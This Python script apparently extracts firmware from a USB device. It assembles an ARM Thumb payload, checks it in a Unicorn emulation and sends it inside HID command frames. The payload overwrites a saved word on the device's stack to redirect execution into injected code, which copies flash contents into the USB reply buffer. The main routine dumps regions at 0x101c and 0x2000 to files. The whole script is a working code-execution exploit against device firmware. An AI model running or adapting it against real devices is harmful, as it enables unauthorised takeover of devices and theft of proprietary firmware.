"""Multi-byte CPU flash reads through the observed native USB TX callback.

Only 0x00000000..0x0001ffff CPU code/flash candidates are accepted; no MMIO.
Writes: verified caller RAM stack word and native RAM reply buffer only.
No DATA/COMPLETE, flash controller, erase, or programming operation.
"""
import json,struct,hashlib,time
from pathlib import Path
from timing_channel import BASE,ENTRIES,Channel,probe
from keystone import Ks,KS_ARCH_ARM,KS_MODE_THUMB
from capstone import Cs,CS_ARCH_ARM,CS_MODE_THUMB,CS_MODE_MCLASS
from unicorn import Uc,UC_ARCH_ARM,UC_MODE_THUMB,UC_MODE_MCLASS,UC_HOOK_MEM_WRITE,UC_HOOK_CODE
from unicorn.arm_const import *

MAX_FLASH=0x20000
ART=Path('readonly_stub/block_probes')
EMULATED_ROM_PATTERN=bytes((i*17+9)&255 for i in range(256))*(MAX_FLASH//256)

def mov32(reg,value):
    octets=value.to_bytes(4,'big'); parts=[f'movs {reg}, #{octets[0]}']
    for byte in octets[1:]: parts.extend([f'lsls {reg}, #8',f'adds {reg}, #{byte}'])
    return '; '.join(parts)

def build_block(address,length):
    assert 0<=address<MAX_FLASH and 1<=length<=56 and address+length<=MAX_FLASH
    ks=Ks(KS_ARCH_ARM,KS_MODE_THUMB)
    image=bytearray(b'\x70\x47'*220)
    for offset in ENTRIES: image[offset:offset+4]=b'\x00\x20\x70\x47'
    branch,_=ks.asm('b #0x20000080',BASE+0x13a); image[0x13a:0x13c]=bytes(branch)
    setup='''
        mov r0, lr
        movs r2, #0x10
        lsls r2, #8
        adds r2, #0x21
        cmp r0, r2
        bne done
        ldr r0, [sp, #52]
        movs r2, #0x0c
        lsls r2, #8
        adds r2, #0xc3
        cmp r0, r2
        bne done
        movs r2, #0x20
        lsls r2, #24
        adds r2, #255
        adds r2, #66
        str r2, [sp, #52]
done:
        movs r0, #0
        bx lr
    '''
    tail=mov32('r0',address)+f'''
        mov r2, r4
        adds r2, #8
        movs r1, #{length}
copy_loop:
        ldrb r3, [r0]
        strb r3, [r2]
        adds r0, #1
        adds r2, #1
        subs r1, #1
        bne copy_loop
        movs r1, #{length}
        strh r1, [r4, #4]
        mov r0, r4
        adds r0, #255
        adds r0, #255
        adds r0, #2
        ldr r0, [r0, #20]
        blx r0
        movs r3, #0x0e
        lsls r3, #8
        adds r3, #0x71
        bx r3
    '''
    first,_=ks.asm(setup,BASE+0x80); last,_=ks.asm(tail,BASE+0x140)
    assert 0x80+len(first)<=0xda and 0x140+len(last)<=440
    image[0x80:0x80+len(first)]=bytes(first); image[0x140:0x140+len(last)]=bytes(last)
    md=Cs(CS_ARCH_ARM,CS_MODE_THUMB|CS_MODE_MCLASS)
    decoded=list(md.disasm(bytes(image),BASE))
    assert sum(i.size for i in decoded)==440
    assert all(i.mnemonic in ['b','bx','blx','mov','movs','lsls','adds','subs','cmp','bne','ldr','ldrb','str','strb','strh'] for i in decoded)
    # Exercise exact recovered native control flow, with USB callback mocked.
    uc=Uc(UC_ARCH_ARM,UC_MODE_THUMB|UC_MODE_MCLASS)
    uc.mem_map(0,MAX_FLASH); uc.mem_map(BASE,0x4000)
    uc.mem_write(0,EMULATED_ROM_PATTERN)
    fixtures={0x22c:'03b40148019001bd3b010020',0x101c:'fff706f933e0',0x108a:'002068e7',0xf60:'09b0f0bd',0xa00:'7047'}
    for location,hexdata in fixtures.items(): uc.mem_write(location,bytes.fromhex(hexdata))
    uc.mem_write(BASE,bytes(image))
    expected=bytes(uc.mem_read(address,length))
    sp=BASE+0x1000; context=BASE+0x2000
    uc.reg_write(UC_ARM_REG_SP,sp)
    uc.mem_write(sp+36,struct.pack('<5I',context,5,6,7,0xcc3))
    uc.mem_write(context,bytes.fromhex('01000073e8010177')+b'\xa5'*56)
    uc.mem_write(context+0x214,struct.pack('<I',0xa01))
    writes=[]; replies=[]
    uc.hook_add(UC_HOOK_MEM_WRITE,lambda u,a,addr,size,value,d:writes.append((addr,size,value)))
    uc.hook_add(UC_HOOK_CODE,lambda u,a,s,d:replies.append(bytes(u.mem_read(context,64))),begin=0xa00,end=0xa00)
    uc.emu_start(0x101d,0xe70,count=1000)
    assert uc.reg_read(UC_ARM_REG_PC)==0xe70 and uc.reg_read(UC_ARM_REG_SP)==sp+56
    assert len(replies)==1 and replies[0][8:8+length]==expected
    assert struct.unpack_from('<H',replies[0],4)[0]==length
    assert all((a in [sp-8,sp-4,sp+52] and size==4) or (a==context+4 and size==2) or (context+8<=a<context+8+length and size==1) for a,size,v in writes)
    ART.mkdir(parents=True,exist_ok=True)
    # Keep a small reproducible representative instead of one file per dump chunk.
    if address in [0x101c,0x2000] or address%0x1000==0:
        stem=f'block_{address:08x}_{length}'
        (ART/f'{stem}.bin').write_bytes(image)
        (ART/f'{stem}.s').write_text(setup+'\n/* tail at 0x20000140 */\n'+tail)
    return bytes(image),dict(address=address,length=length,sha256=hashlib.sha256(image).hexdigest(),bounded_write_emulation_passed=True)

class BlockReader:
    def __init__(self): self.channel=Channel(); self.records=[]
    def open(self):
        self.channel.open()
        assert self.channel.version['version_words_hex']==['a1050000','a1040000']
    def read(self,address,length):
        assert 0<=address and length>=1 and address+length<=MAX_FLASH
        result=bytearray()
        for current in range(address,address+length,56):
            count=min(56,address+length-current); image,spec=build_block(current,count)
            frame=bytearray(self.channel.original); frame[52:492]=image
            from functools import reduce
            struct.pack_into('<I',frame,492,reduce(int.__xor__,struct.unpack('<110I',image),0))
            for offset in range(0,len(frame),64):
                assert self.channel.h.write(b'\0'+bytes(frame[offset:offset+64]).ljust(64,b'\0'))==65
            reply=bytes(self.channel.h.read(65,2000))
            if len(reply)==65 and reply[0]==0: reply=reply[1:]
            record=dict(spec=spec,reply_hex=reply.hex()); self.records.append(record)
            assert len(reply)==64 and reply[:4]==bytes.fromhex('01000073') and reply[6:8]==bytes.fromhex('0177'),record
            assert struct.unpack_from('<H',reply,4)[0]==count,record
            result.extend(reply[8:8+count])
        return bytes(result)
    def close(self):
        result={}
        if self.channel.h:
            normal,_=probe('cal',0); result['normal_START']=self.channel.send(normal)
        result['final_state']=self.channel.close(); return result

if __name__=='__main__':
    reader=BlockReader(); log=dict(blocks=[])
    try:
        reader.open(); log['version']=reader.channel.version
        check=reader.read(0x101c,6); assert check==bytes.fromhex('fff706f933e0')
        log['blocks'].append(dict(address='0x101c',hex=check.hex(),independently_verified=True))
        vectors=reader.read(0x2000,56)
        Path('application_vectors_2000.bin').write_bytes(vectors)
        log['blocks'].append(dict(address='0x2000',hex=vectors.hex()))
        log['verified_multi_byte_usb_reply']=True
    except Exception as error:
        log['error']=str(error); raise
    finally:
        log['transactions']=reader.records; log['cleanup']=reader.close()
        Path('usb_block_reader_live.json').write_text(json.dumps(log,indent=2))
        print(json.dumps({k:v for k,v in log.items() if k!='transactions'}),flush=True)
